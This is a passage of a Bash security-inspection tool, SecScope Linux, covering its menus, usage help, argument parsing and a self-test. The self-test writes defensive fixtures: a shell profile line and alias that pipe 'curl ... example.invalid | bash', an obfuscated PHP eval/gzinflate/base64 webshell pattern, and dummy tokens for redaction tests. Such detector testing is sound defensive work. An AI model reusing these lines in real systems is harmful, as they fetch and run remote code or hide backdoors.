        1) FIRST_RUN_PROFILE=fast-hunt; [ "$FAST_ENABLED" = true ] || { log_warn '快速巡检当前未启用'; return 1; } ;;
        2) FIRST_RUN_PROFILE=daily-hunt; [ "$DAILY_ENABLED" = true ] || { log_warn '日常巡检当前未启用'; return 1; } ;;
        3) FIRST_RUN_PROFILE=full; [ "$FULL_ENABLED" = true ] || { log_warn '完整巡检当前未启用'; return 1; } ;;
    esac
    SCHEDULE_MODE=interval; PROFILE_SCHEDULE_EXPLICIT=true; SCHEDULE_CONFIG_EXPLICIT=true; FIRST_RUN_EXPLICIT=true
    interactive_menu '确认安装定时巡检' \
        "安装：fast=${FAST_ENABLED}/${FAST_INTERVAL}，daily=${DAILY_ENABLED}/${DAILY_INTERVAL}，full=${FULL_ENABLED}/${FULL_INTERVAL}" \
        "首次执行：${FIRST_RUN_PROFILE}" '返回修改' || return 1
    [ "$INTERACTIVE_MENU_RESULT" -eq 0 ] || return 1
    INSTALL_REQUEST=true
}

interactive_scan_settings() {
    local choice
    interactive_menu '扫描设置' '快速巡检' '日常巡检（推荐）' '完整巡检' '自动识别主机角色' \
        '通用服务器' 'Web 服务器' '数据库服务器' '文件服务器' '开发/构建服务器' '返回' || return 1
    choice=$INTERACTIVE_MENU_RESULT
    case "$choice" in
        0) SCAN_PROFILE=fast-hunt; PROFILE_EXPLICIT=true ;; 1) SCAN_PROFILE=daily-hunt; PROFILE_EXPLICIT=true ;;
        2) SCAN_PROFILE=full; PROFILE_EXPLICIT=true ;; 3) HOST_ROLE=auto ;; 4) HOST_ROLE=generic ;;
        5) HOST_ROLE=web-server ;; 6) HOST_ROLE=database-server ;; 7) HOST_ROLE=file-server ;;
        8) HOST_ROLE=dev ;; 9) return 0 ;;
    esac
}

interactive_start_menu() {
    local choice
    while true; do
        interactive_menu 'SecScope Linux 主菜单' '开始扫描' '安装定时巡检' '修改扫描设置' \
            '运行自检' '卸载 SecScope' '退出' || return 1
        choice=$INTERACTIVE_MENU_RESULT
        case "$choice" in
            0) interactive_scan_wizard && return 0 ;;
            1) interactive_install_wizard && return 0 ;;
            2) interactive_scan_settings ;;
            3) SELF_TEST=true; return 0 ;;
            4) UNINSTALL_REQUEST=true; return 0 ;;
            5) return 1 ;;
        esac
    done
}

print_usage() {
    cat <<'USAGE'
用法: bash secscope.sh [选项]

巡检与状态:
  --mode hunt|full         默认 Hunt；Hunt 突出威胁/异常/IOC/攻击链，Full 同时呈现基线与运行观察
  --profile fast-hunt|daily-hunt|full|corpus-validation  扫描档位；默认 daily-hunt
  --corpus-root DIR        corpus-validation 的隔离样本根目录
  --corpus-manifest FILE   JSONL 清单；每行含 path，可选 sha256、sample_id、lane
  --host-role ROLE         公共角色：workstation/member-server/domain-controller/web-server/database-server/file-server/rdp-server/kubernetes/bastion/dev/generic
  --output DIR             指定本轮报告目录
  --report-root DIR        指定默认报告根目录
  --state-dir DIR          指定跨轮状态目录
  --init-state             首轮现有发现记为 BASELINE_EXISTING
  --reset-state            备份并重建状态，首轮作为基线
  --no-state               禁用跨轮记忆
  --include-sensitive      HTML 报告正文不脱敏（raw/ 原始证据始终受 0600 保护）
  --archive                完成后生成权限收紧的 .tar.gz 证据包
  --share-package          保留完整证据，并生成同级 *_share 脱敏分享副本
  --file-scan-config FILE  指定 Linux 文件增量监控配置

显式应急处置（默认关闭）:
  --process-control FILE   执行权限为 0600 的 Native 进程处置请求
  --findings FILE          产生目标高危进程结论的 findings.json
  --audit-log FILE         进程处置 JSONL 审计日志；与 --process-control 同时使用

运行与部署:
  --scheduled              systemd 定时运行模式
  --schedule-time HH:MM    安装每日定时任务并指定执行时间
  --schedule-cron EXPR     安装 Linux cron 五字段定时任务，例如 "0 */1 * * *"
  --schedule-interval      保留旧参数；安装分层 systemd timer
  --install                安装或更新 systemd/secscope@.service 与三层 timer
  --first-run PROFILE      安装后首次只执行 fast、daily、full，或 none（默认 none）
  --uninstall              卸载程序和 timer，保留配置、状态和报告
  --self-test              运行内置核心逻辑自检
  --json                   兼容旧参数（仅生成 HTML）
  --help                   显示帮助

报告默认写入程序目录下的独立运行目录，并生成 HTML、raw/ 与完整性清单。
USAGE
}

reset_test_findings() {
    FINDINGS=(); FINDING_SEVS=(); FINDING_CATS=(); FINDING_SUMMARIES=(); FINDING_EVIDENCES=()
    FINDING_RECOMMENDATIONS=(); FINDING_MITRES=(); FINDING_RULE_IDS=(); FINDING_ENTITY_KEYS=(); FINDING_ENTITY_TYPES=()
    FINDING_FINGERPRINTS=(); FINDING_EVIDENCE_HASHES=(); FINDING_EVIDENCE_PART_HASHES=(); FINDING_MODULES=(); FINDING_LIFECYCLES=()
    FINDING_FIRST_SEEN=(); FINDING_LAST_SEEN=(); FINDING_OCCURRENCES=(); FINDING_RAW_REFS=(); FINDING_ID=0
    FINDING_TYPES=(); FINDING_CONFIDENCES=(); FINDING_JUDGMENT_BASES=(); FINDING_ESCALATION_CONDITIONS=()
    FINDING_EVIDENCE_DOMAINS=(); FINDING_DOMAIN_COUNTS=(); FINDING_COUNTER_EVIDENCE=(); FINDING_TIMELINES=()
    ATTACK_CHAIN_IDS=(); ATTACK_CHAIN_TITLES=(); ATTACK_CHAIN_DOMAINS=(); ATTACK_CHAIN_TIMELINES=(); ATTACK_CHAIN_EVIDENCES=()
}

run_self_test() {
    local test_root failures=0 quoted redacted profile_test
    test_root=$(mktemp -d "${TMPDIR:-/tmp}/secscope-selftest.XXXXXX") || return 1
    quoted=$(json_quote $'quote" slash\\ newline\n')
    if command -v python3 >/dev/null 2>&1; then
        printf '%s' "$quoted" | python3 -c 'import json,sys; json.load(sys.stdin)' || failures=$((failures + 1))
    fi
    redacted=$(redact_text 'token=secret-value password: hunter2 --api-key abc123 -U 0123456789abcdef0123456789abcdef Authorization: Bearer.credential Bearer eyJhbGciOiJIUzI1NiJ9.payload.signature NOPASSWD: ALL')
    [[ "$redacted" == *secret-value* || "$redacted" == *hunter2* || "$redacted" == *abc123* || "$redacted" == *0123456789abcdef0123456789abcdef* || "$redacted" == *eyJhbGciOiJIUzI1NiJ9* ]] && failures=$((failures + 1))
    [[ "$redacted" == *'NOPASSWD: ALL'* ]] || failures=$((failures + 1))

    profile_test="$test_root/profile"
    printf '%s\n' '[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"' \
        'test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"' \
        "alias ls='ls --color=auto'" "alias ps='ps aux'" > "$profile_test"
    [ -z "$(profile_suspicious_lines "$profile_test")" ] || failures=$((failures + 1))
    printf '%s\n' "alias ls='curl -fsSL https://example.invalid/x | bash'" >> "$profile_test"
    [ -n "$(profile_suspicious_lines "$profile_test")" ] || failures=$((failures + 1))
    printf '%s\n' 'curl -fsSL https://example.invalid/x | bash' > "$profile_test"
    [ -n "$(profile_suspicious_lines "$profile_test")" ] || failures=$((failures + 1))
    file_is_candidate /etc/shadow || failures=$((failures + 1))
    file_is_candidate /home/test/.ssh/authorized_keys || failures=$((failures + 1))
    file_is_candidate /etc/hostname && failures=$((failures + 1))
    critical_persistence_path /etc/pam.d/sshd || failures=$((failures + 1))
    critical_persistence_path /tmp/ordinary.sh && failures=$((failures + 1))
    [ "$(default_finding_type MEDIUM process)" = SECURITY_ANOMALY ] || failures=$((failures + 1))
    [ "$(default_finding_type HIGH process)" = SECURITY_THREAT ] || failures=$((failures + 1))

    reset_test_findings
    CURRENT_MODULE="selftest"
    record_find LOW process 'self-test finding' 'evidence-a' 'none' '' 'TEST-001' 'entity-a'
    record_find HIGH process 'self-test finding' 'evidence-b' 'none' '' 'TEST-001' 'entity-a'
    [ "${#FINDINGS[@]}" -eq 1 ] || failures=$((failures + 1))
    [ "${FINDING_SEVS[0]}" = HIGH ] || failures=$((failures + 1))
    [ "${FINDING_TYPES[0]}" = SECURITY_ANOMALY ] || failures=$((failures + 1))
    [ "${FINDING_DOMAIN_COUNTS[0]}" -eq 1 ] || failures=$((failures + 1))

    # 普通 Web 应用调用 eval/system/base64_decode 不应仅凭关键字命中。
    printf '%s\n' '<?php $x=base64_decode($input); if ($debug) { system("id"); } eval($trustedTemplate); ?>' > "$test_root/normal.php"
    [ "$(web_static_structure_score "$test_root/normal.php" | cut -f1)" -eq 0 ] || failures=$((failures + 1))
    printf '%s\n' '<?php $f="ev"."al"; $f(gzinflate(base64_decode($payload))); ?>' > "$test_root/obfuscated.php"
    [ "$(web_static_structure_score "$test_root/obfuscated.php" | cut -f1)" -ge 4 ] || failures=$((failures + 1))
    local file_entity_before file_entity_after yara_init_line static_scan_line
    file_entity_before=$(stable_linux_entity "$test_root/obfuscated.php" fixture)
    printf '%s\n' '// changed non-executable fixture' >> "$test_root/obfuscated.php"
    file_entity_after=$(stable_linux_entity "$test_root/obfuscated.php" fixture)
    [[ "$file_entity_before" == file:* && "$file_entity_before" == *obfuscated.php:* && "$file_entity_before" != "$file_entity_after" ]] || failures=$((failures + 1))
    yara_init_line=$(grep -n '^[[:space:]]*initialize_yara_capability$' "$PROGRAM_DIR/secscope.sh" | head -1 | cut -d: -f1)
    static_scan_line=$(grep -n '^[[:space:]]*scan_web_static_structures$' "$PROGRAM_DIR/secscope.sh" | head -1 | cut -d: -f1)
    [[ "$yara_init_line" =~ ^[0-9]+$ && "$static_scan_line" =~ ^[0-9]+$ && "$yara_init_line" -lt "$static_scan_line" ]] || failures=$((failures + 1))
    declare -f correlate_web_attack_chain | grep -q 'process_instance_id=' || failures=$((failures + 1))
    declare -f correlate_web_attack_chain | grep -q 'CONTEXT_ONLY_NO_PID' || failures=$((failures + 1))
    reset_test_findings
    record_find HIGH process 'two-domain anomaly' 'process and network' 'review' '' 'TEST-TWO-DOMAIN' 'two' '' 'SECURITY_THREAT' HIGH 'test' 'add one domain' 'PROCESS,NETWORK'
    [ "${FINDING_TYPES[0]}" = SECURITY_ANOMALY ] || failures=$((failures + 1))
    record_find HIGH process 'three-domain threat' 'process file network' 'respond' '' 'TEST-THREE-DOMAIN' 'three' '' 'SECURITY_THREAT' HIGH 'test' 'none' 'PROCESS,FILE,NETWORK'
    [ "${FINDING_TYPES[1]}" = SECURITY_THREAT ] || failures=$((failures + 1))
    ipv4_in_cidr 10.20.30.40 10.20.0.0/16 || failures=$((failures + 1))
    ipv4_in_cidr 10.21.30.40 10.20.0.0/16 && failures=$((failures + 1))
    ALLOWED_PORT_RULES=('TCP/8000-8999' '53')
    is_allowed_listener_port 8443 TCP || failures=$((failures + 1))
    is_allowed_listener_port 8443 UDP && failures=$((failures + 1))
    is_allowed_listener_port 53 UDP || failures=$((failures + 1))

    STATE_DIR="$test_root/state"; INIT_STATE=true; RESET_STATE=false; STATE_ENABLED=true
    MODULE_IDS=(selftest); MODULE_NAMES=(selftest); MODULE_STATUSES=(SUCCESS); MODULE_DURATIONS=(0); MODULE_ERRORS=("")
    prepare_state_store || failures=$((failures + 1))
    reconcile_state || failures=$((failures + 1))
    [ "${FINDING_LIFECYCLES[0]}" = BASELINE_EXISTING ] || failures=$((failures + 1))
    [ -s "$STATE_COMMIT_PENDING" ] || failures=$((failures + 1))
    commit_alert_state || failures=$((failures + 1))
    RAW_DIR="$test_root/raw"; mkdir -p "$RAW_DIR"
    printf 'self-test evidence\n' | dump_raw "sample.txt"
    RUN_FINISHED_AT=$(date -u +%Y-%m-%dT%H:%M:%SZ)
    generate_evidence_manifest || failures=$((failures + 1))
    grep -q 'sample.txt' "$RAW_DIR/manifest.sha256" 2>/dev/null || failures=$((failures + 1))
    grep -q '"sha256"' "$RAW_DIR/manifest.json" 2>/dev/null || failures=$((failures + 1))
    AUTH_BEHAVIOR_ENABLED=true; AUTH_MAX_EVENTS=20; CURRENT_MODULE=logs
    AUTH_EVENTS='Jul 31 01:02:03 host sshd[123]: Accepted password for selftest from 8.8.8.8 port 50123 ssh2'
    analyze_ssh_auth_behavior || failures=$((failures + 1))
    grep -q '|selftest|8.8.8.8|password|' "$AUTH_PROFILE_FILE" 2>/dev/null || failures=$((failures + 1))
    valid_schedule_time '03:45' || failures=$((failures + 1))
    valid_schedule_time '24:00' && failures=$((failures + 1))
    write_timer_unit "$test_root/daily.timer" daily '03:45' || failures=$((failures + 1))
    grep -q '^OnCalendar=\*-\*-\* 03:45:00$' "$test_root/daily.timer" 2>/dev/null || failures=$((failures + 1))
    write_profile_timer_unit "$test_root/fast.timer" fast-hunt '30min' fast-hunt || failures=$((failures + 1))
    grep -q '^OnBootSec=3min$' "$test_root/fast.timer" 2>/dev/null || failures=$((failures + 1))
    write_profile_timer_unit "$test_root/daily.timer" daily-hunt '2h' none || failures=$((failures + 1))
    grep -q '^OnActiveSec=2h$' "$test_root/daily.timer" 2>/dev/null || failures=$((failures + 1))
    valid_cron_expression '0 */1 * * *' || failures=$((failures + 1))
    valid_cron_expression '*/15 9-17 * * 1-5' || failures=$((failures + 1))
    valid_cron_expression '0 0 32 * *' && failures=$((failures + 1))
    valid_cron_expression '0 */0 * * *' && failures=$((failures + 1))
    write_cron_file "$test_root/secscope.cron" '0 */1 * * *' || failures=$((failures + 1))
    grep -q '^0 \*/1 \* \* \* root .*systemctl start --no-block secscope.service' "$test_root/secscope.cron" 2>/dev/null || failures=$((failures + 1))

    # 报告、证据域门禁、RAT 证据图、排序、筛选与完整性自检。
    reset_test_findings
    CURRENT_MODULE=process
    record_find LOW process 'low finding' 'low evidence' 'observe' '' 'TEST-LOW' 'low'
    record_find CRITICAL reverseshell 'critical finding' 'PID=123 socket connection' 'investigate' 'T1059' 'REV-SOCKET-STDIO' 'critical' \
        'process-context.tsv,ss_established.txt' 'SECURITY_THREAT' HIGH 'direct socket stdio' 'verify authorization' 'PROCESS,NETWORK' 'no allowlist' 'test|PROCESS|shell;test|NETWORK|socket'
    FINDING_LIFECYCLES[0]=ONGOING; FINDING_LIFECYCLES[1]=NEW
    LIFECYCLE_NEW=1; LIFECYCLE_CHANGED=0; LIFECYCLE_ESCALATED=0; LIFECYCLE_DEESCALATED=0; LIFECYCLE_REOPENED=0; LIFECYCLE_RESOLVED=0
    MODULE_IDS=(system process); MODULE_NAMES=('系统信息' '进程检查'); MODULE_STATUSES=(SUCCESS PARTIAL); MODULE_DURATIONS=(1 2); MODULE_ERRORS=('' 'missing:test')
    ENDPOINT_NAMES=(ClamAV); ENDPOINT_STATUSES=(运行中); ENDPOINT_DETAILS=('病毒库 1 天前更新'); ENDPOINT_SOURCES=(systemd)
    PRIORITY_KEYS=(recent-reboot); PRIORITY_ITEMS=(近期重启); PRIORITY_STATUSES=('运行时间 30 分钟'); PRIORITY_RECOMMENDATIONS=('核查变更窗口')
    LOCAL_ADDRESSES=(192.0.2.10); OS_NAME='Linux SelfTest'; KERNEL_VER='test-kernel'; HOST_ROLE=generic
    STATE_HEALTH=OK; AUTH_PROFILE_HEALTH=INITIALIZED; RUN_COVERAGE=80; RUN_FINISHED_AT=$(date -u +%Y-%m-%dT%H:%M:%SZ)
    REPORT_ROOT="$test_root/reports"; mkdir -p "$REPORT_ROOT"; : > "$REPORT_ROOT/.secscope-report-root"
    OUTPUT_DIR="$REPORT_ROOT/${TIMESTAMP}_selftest_$$"; RAW_DIR="$OUTPUT_DIR/raw"; mkdir -p "$RAW_DIR"
    printf 'self-test raw evidence\n' > "$RAW_DIR/sample.txt"
    HTML_FILE="$OUTPUT_DIR/report_selftest.html"
    recalculate_severity_counts
    generate_html_report 'self test' || failures=$((failures + 1))
    grep -q 'Linux 主机安全巡检报告' "$HTML_FILE" 2>/dev/null || failures=$((failures + 1))
    grep -q 'critical finding' "$HTML_FILE" 2>/dev/null || failures=$((failures + 1))
    grep -q 'low finding' "$HTML_FILE" 2>/dev/null || failures=$((failures + 1))
    grep -q 'data-section="threat"' "$HTML_FILE" 2>/dev/null || failures=$((failures + 1))
    grep -q '已确认或高置信安全威胁' "$HTML_FILE" 2>/dev/null || failures=$((failures + 1))
    grep -q '待研判安全异常' "$HTML_FILE" 2>/dev/null || failures=$((failures + 1))
    grep -q 'report-confidence' "$HTML_FILE" 2>/dev/null || failures=$((failures + 1))
    grep -q 'class="evidence-row" hidden><td colspan="5"' "$HTML_FILE" 2>/dev/null || failures=$((failures + 1))
    grep -Eq 'LOCAL_IPS_PLACEHOLDER|PROFILE_PLACEHOLDER|THREAT_TOTAL_VALUE|THREAT_CRITICAL_VALUE|THREAT_HIGH_VALUE|CHANGE_TOTAL_VALUE|MODULE_COUNT_VALUE|ENDPOINT_TABLE|CHANGE_STATS|RAW_ROWS|ANOMALY_TABLE|TRUST_TABLE|OBSERVATION_TABLE|FILE_TABLE|YARA_TABLE|ABNORMAL_CONNECTION_TABLE|COMPONENT_TABLE|VISIBILITY_TEXT|VISIBILITY_TABLE' "$HTML_FILE" 2>/dev/null && failures=$((failures + 1))
    grep -q 'YARA 命中' "$HTML_FILE" 2>/dev/null || failures=$((failures + 1))
    write_findings_json || failures=$((failures + 1))
    write_status_json 'self test' || failures=$((failures + 1))
    generate_evidence_manifest || failures=$((failures + 1))
    write_raw_manifest || failures=$((failures + 1))
    printf '%s  %s\n' "$(sha256_file "$HTML_FILE")" "$(basename "$HTML_FILE")" > "$OUTPUT_DIR/report.sha256"
    write_integrity_verifier || failures=$((failures + 1))
    printf 'transient\n' > "$OUTPUT_DIR/.file_inventory.pending"
    write_report_manifest || failures=$((failures + 1))
    grep -q 'file_inventory.pending' "$OUTPUT_DIR/report-manifest.json" 2>/dev/null && failures=$((failures + 1))
    bash "$OUTPUT_DIR/verify-report.sh" >/dev/null || failures=$((failures + 1))
    printf 'untracked evidence\n' > "$OUTPUT_DIR/untracked.txt"
    if command -v python3 >/dev/null 2>&1; then
        bash "$OUTPUT_DIR/verify-report.sh" >/dev/null 2>&1 && failures=$((failures + 1))
    else
        bash "$OUTPUT_DIR/verify-report.sh" >/dev/null 2>&1 || failures=$((failures + 1))
    fi
    rm -f "$OUTPUT_DIR/untracked.txt"
    printf 'tampered evidence\n' >> "$RAW_DIR/sample.txt"
    bash "$OUTPUT_DIR/verify-report.sh" >/dev/null 2>&1 && failures=$((failures + 1))
    printf 'self-test raw evidence\n' > "$RAW_DIR/sample.txt"
    if command -v python3 >/dev/null 2>&1; then
        python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); assert d["schema_version"] == 3 and d["platform"] == "linux" and d["profile"] in ("fast-hunt","daily-hunt","full","corpus-validation") and d["local_addresses"] and d["portable_paths"]["findings"] == "findings.json"; assert "telemetry_health" in d and "process_behavior_baseline" in d and "beacon_detection" in d and "connection_baseline" in d; assert d["web_access_log"]["WEB_ACCESS_LOG_STATUS"] in ("MISSING","AVAILABLE","PARTIAL"); assert "priority_model" in d["file_monitoring"] and "priority_model" in d["file_scan"]; assert "container_context" in d and "kubernetes_context" in d; assert d["yara"]["mode"] in ("disabled","lite","standard","full","forensic") and "promoted_findings" in d["yara"]' "$STATUS_FILE" || failures=$((failures + 1))
        python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); types={x["finding_type"] for x in d["findings"]}; assert "SECURITY_THREAT" in types and "SECURITY_ANOMALY" in types and "file_changes" in d and "abnormal_connections" in d; assert all(isinstance(x["evidence_domains"],list) and isinstance(x["attack_timeline"],list) and x["evidence_domain_count"]==len(set(x["evidence_domains"])) for x in d["findings"])' "$OUTPUT_DIR/findings.json" || failures=$((failures + 1))
        python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); assert "files" in d' "$OUTPUT_DIR/raw-manifest.json" || failures=$((failures + 1))
        python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); assert "files" in d' "$OUTPUT_DIR/report-manifest.json" || failures=$((failures + 1))
    fi
    update_report_archive_index || failures=$((failures + 1))
    grep -q '打开报告' "$REPORT_ROOT/index.html" 2>/dev/null || failures=$((failures + 1))
    grep -q 'ARCHIVE_ROWS' "$REPORT_ROOT/index.html" 2>/dev/null && failures=$((failures + 1))
    rm -rf -- "$test_root"
    if [ "$failures" -eq 0 ]; then
        log_info '自检通过：证据域门禁、Web 静态误报回归、五类发现、JSON、脱敏、认证画像、证据完整性、HTML 时间线和定时配置正常'
        return 0
    fi
    log_error "自检失败: ${failures} 项"
    return 1
}

main() {
    local lock_rc safe_host report_profile_dir requested_mode profile_arg report_failed=0 state_failed=0 final_verdict
    if [ $# -eq 0 ] && [ -t 0 ] && [ -t 1 ]; then
        interactive_start_menu || return 0
    fi
    while [ $# -gt 0 ]; do
        case "$1" in
            --json) shift ;;
            --output|--state-dir|--report-root|--file-scan-config|--mode|--profile|--host-role|--corpus-root|--corpus-manifest|--process-control|--findings|--audit-log)
                if [ $# -lt 2 ] || [ -z "$2" ]; then log_error "$1 需要一个目录参数"; return 2; fi
                case "$1" in
                    --output) OUTPUT_DIR="$2"; OUTPUT_DIR_EXPLICIT=true ;;
                    --state-dir) STATE_DIR="$2" ;;
                    --report-root) REPORT_ROOT="$2" ;;
                    --file-scan-config) FILE_SCAN_CONFIG_FILE="$2" ;;
                    --mode) case "$(printf '%s' "$2" | tr '[:upper:]' '[:lower:]')" in hunt) RUN_MODE=Hunt; MODE_EXPLICIT=true ;; full) RUN_MODE=Full; MODE_EXPLICIT=true ;; *) log_error '--mode 仅支持 hunt 或 full'; return 2 ;; esac ;;
                    --profile) profile_arg=$(printf '%s' "$2" | tr '[:upper:]' '[:lower:]'); case "$profile_arg" in fast-hunt|daily-hunt|full|corpus-validation) SCAN_PROFILE="$profile_arg"; PROFILE_EXPLICIT=true ;; *) log_error '--profile 仅支持 fast-hunt、daily-hunt、full 或 corpus-validation'; return 2 ;; esac ;;
                    --host-role) HOST_ROLE=$(printf '%s' "$2" | tr '[:upper:]' '[:lower:]') ;;
                    --corpus-root) CORPUS_ROOT="$2" ;;
                    --corpus-manifest) CORPUS_MANIFEST_FILE="$2" ;;
                    --process-control) PROCESS_CONTROL_REQUEST="$2" ;;
                    --findings) PROCESS_CONTROL_FINDINGS="$2" ;;
                    --audit-log) PROCESS_CONTROL_AUDIT_LOG="$2" ;;
                esac
                shift 2
                ;;
            --init-state) INIT_STATE=true; shift ;;
            --reset-state) RESET_STATE=true; shift ;;
            --no-state) STATE_ENABLED=false; shift ;;
            --scheduled) SCHEDULED_RUN=true; EXECUTION_MODE="scheduled"; shift ;;
            --schedule-time)
                if [ $# -lt 2 ] || ! valid_schedule_time "$2"; then
                    log_error '--schedule-time 需要 HH:MM 格式（00:00-23:59）'
                    return 2
                fi
                SCHEDULE_MODE=daily; SCHEDULE_TIME="$2"; SCHEDULE_CONFIG_EXPLICIT=true; INSTALL_REQUEST=true; shift 2
                ;;
            --schedule-cron)
                if [ $# -lt 2 ] || ! normalize_cron_expression "$2"; then
                    log_error '--schedule-cron 需要标准 Linux cron 五字段表达式，例如 "0 */1 * * *"'
                    return 2
                fi
                SCHEDULE_MODE=cron; SCHEDULE_CRON="$NORMALIZED_CRON"; SCHEDULE_CONFIG_EXPLICIT=true; INSTALL_REQUEST=true; shift 2
                ;;
            --schedule-interval) SCHEDULE_MODE=interval; SCHEDULE_CONFIG_EXPLICIT=true; INSTALL_REQUEST=true; shift ;;
            --include-sensitive) INCLUDE_SENSITIVE=true; shift ;;
            --archive) CREATE_ARCHIVE=true; shift ;;
            --share-package) SHARE_PACKAGE=true; shift ;;
            --first-run)
                if [ $# -lt 2 ]; then log_error '--first-run 需要 fast、daily、full 或 none'; return 2; fi
                case "$2" in fast|fast-hunt) FIRST_RUN_PROFILE=fast-hunt ;; daily|daily-hunt) FIRST_RUN_PROFILE=daily-hunt ;; full|none) FIRST_RUN_PROFILE="$2" ;; *) log_error '--first-run 仅支持 fast、daily、full 或 none'; return 2 ;; esac
                FIRST_RUN_EXPLICIT=true; INSTALL_REQUEST=true; shift 2
                ;;
            --install) INSTALL_REQUEST=true; shift ;;
            --uninstall) UNINSTALL_REQUEST=true; shift ;;
            --self-test) SELF_TEST=true; shift ;;
            --help|-h) print_usage; return 0 ;;
            --) shift; [ $# -eq 0 ] || { log_error "不支持位置参数: $*"; return 2; }; break ;;
            *) log_error "未知参数: $1"; return 2 ;;
        esac
    done
    if [ "$SCHEDULED_RUN" = true ] || ! panel_supported; then
        RED=''; GREEN=''; YELLOW=''; BLUE=''; MAGENTA=''; CYAN=''; BOLD=''; DIM=''; NC=''
    fi

    requested_mode="$RUN_MODE"
    if [ "$PROFILE_EXPLICIT" = false ] && [ "$RUN_MODE" = Full ]; then SCAN_PROFILE=full; fi
    apply_scan_profile || { log_error "无效扫描 Profile: $SCAN_PROFILE"; return 2; }
    [ "$MODE_EXPLICIT" = false ] || RUN_MODE="$requested_mode"
    if [ "$SCAN_PROFILE" = corpus-validation ]; then
        [ -n "$CORPUS_ROOT" ] && [ -n "$CORPUS_MANIFEST_FILE" ] || { log_error 'corpus-validation 必须同时指定 --corpus-root 和 --corpus-manifest'; return 2; }
        [ -d "$CORPUS_ROOT" ] && [ ! -L "$CORPUS_ROOT" ] || { log_error "corpus 根目录无效或为符号链接: $CORPUS_ROOT"; return 2; }
        [ -f "$CORPUS_MANIFEST_FILE" ] && [ ! -L "$CORPUS_MANIFEST_FILE" ] && [ -r "$CORPUS_MANIFEST_FILE" ] || { log_error "corpus 清单不可读或为符号链接: $CORPUS_MANIFEST_FILE"; return 2; }
        [ -r "$CORPUS_MANIFEST_HELPER" ] || { log_error "corpus 清单 helper 不可用: $CORPUS_MANIFEST_HELPER"; return 2; }
        STATE_ENABLED=false
    elif [ -n "$CORPUS_ROOT$CORPUS_MANIFEST_FILE" ]; then
        log_error '--corpus-root/--corpus-manifest 仅允许与 --profile corpus-validation 一起使用'
        return 2
    fi
    for enabled in "$FAST_ENABLED" "$DAILY_ENABLED" "$FULL_ENABLED"; do case "$enabled" in true|false) ;; *) log_error 'SECSCOPE_*_ENABLED 必须为 true 或 false'; return 2 ;; esac; done
    valid_schedule_interval "$FAST_INTERVAL" && valid_schedule_interval "$DAILY_INTERVAL" && valid_schedule_interval "$FULL_INTERVAL" || { log_error 'SECSCOPE_*_INTERVAL 必须使用 10min、30min、1h、2h、6h、12h、1d 或 7d 形式'; return 2; }

    if [ "$INSTALL_REQUEST" = true ] && [ "$UNINSTALL_REQUEST" = true ]; then
        log_error '--install 与 --uninstall 不能同时使用'
        return 2
    fi
    [ "$INSTALL_REQUEST" = false ] || { install_secscope; return $?; }
    [ "$UNINSTALL_REQUEST" = false ] || { uninstall_secscope; return $?; }
    [ "$SELF_TEST" = false ] || { run_self_test; return $?; }
    # Emergency process control is a separate opt-in path. Keep it outside the
    # normal scan flow so scheduled scans cannot reach it accidentally.
    if [ -n "$PROCESS_CONTROL_REQUEST$PROCESS_CONTROL_FINDINGS$PROCESS_CONTROL_AUDIT_LOG" ]; then
        [ -n "$PROCESS_CONTROL_REQUEST" ] && [ -n "$PROCESS_CONTROL_FINDINGS" ] && [ -n "$PROCESS_CONTROL_AUDIT_LOG" ] || {
            log_error '--process-control、--findings 与 --audit-log 必须同时使用'
            return 2
        }
        [ -x "$NATIVE_SCANNER_PATH" ] && [ ! -L "$NATIVE_SCANNER_PATH" ] || {
            log_error "进程处置需要可执行的 native scanner: $NATIVE_SCANNER_PATH"
            return 1
        }
        "$NATIVE_SCANNER_PATH" capabilities 2>/dev/null | grep -q '"native_process_control"' || {
            log_error 'native scanner 不支持进程处置能力'
            return 1
        }
        "$NATIVE_SCANNER_PATH" process-control --request "$PROCESS_CONTROL_REQUEST" --findings "$PROCESS_CONTROL_FINDINGS" --audit-log "$PROCESS_CONTROL_AUDIT_LOG"
        return $?
    fi
    if [ "$STATE_ENABLED" = false ] && { [ "$INIT_STATE" = true ] || [ "$RESET_STATE" = true ]; }; then
        log_error '--no-state 不能与 --init-state 或 --reset-state 同时使用'
        return 2
    fi
    case "$RUN_MODE" in Hunt|Full) ;; *) log_error '运行模式必须为 Hunt 或 Full'; return 2 ;; esac
    case "$SCHEDULE_MODE" in
        interval) ;;
        daily) valid_schedule_time "$SCHEDULE_TIME" || { log_error "无效定时配置: $SCHEDULE_TIME"; return 2; } ;;
        cron) normalize_cron_expression "$SCHEDULE_CRON" || { log_error "无效 cron 定时配置: $SCHEDULE_CRON"; return 2; }; SCHEDULE_CRON="$NORMALIZED_CRON" ;;
        *) log_error "无效调度模式: $SCHEDULE_MODE"; return 2 ;;
    esac
    case "$AUTH_BEHAVIOR_ENABLED" in true|false) ;; *) log_error 'SECSCOPE_AUTH_BEHAVIOR_ENABLED 必须为 true 或 false'; return 2 ;; esac
    [[ "$AUTH_MAX_EVENTS" =~ ^[0-9]+$ ]] && [ "$AUTH_MAX_EVENTS" -ge 1 ] && [ "$AUTH_MAX_EVENTS" -le 5000 ] || {
        log_error 'SECSCOPE_AUTH_MAX_EVENTS 必须是 1-5000 的整数'
        return 2
    }
    [[ "$EVENT_WINDOW_MINUTES" =~ ^[0-9]+$ ]] && [ "$EVENT_WINDOW_MINUTES" -ge 10 ] && [ "$EVENT_WINDOW_MINUTES" -le 10080 ] || {
        log_error 'SECSCOPE_EVENT_WINDOW_MINUTES 必须是 10-10080 的整数'
        return 2
    }
    [[ "$YARA_FILE_TIMEOUT" =~ ^[0-9]+$ ]] && [ "$YARA_FILE_TIMEOUT" -ge 1 ] && [ "$YARA_FILE_TIMEOUT" -le 3600 ] || { log_error 'SECSCOPE_YARA_FILE_TIMEOUT 必须是 1-3600 的整数'; return 2; }
    [[ "$YARA_TOTAL_TIMEOUT" =~ ^[0-9]+$ ]] && [ "$YARA_TOTAL_TIMEOUT" -ge 1 ] && [ "$YARA_TOTAL_TIMEOUT" -le 86400 ] || { log_error 'SECSCOPE_YARA_TOTAL_TIMEOUT 必须是 1-86400 的整数'; return 2; }
    if [ "$YARA_MODE" = disabled ]; then
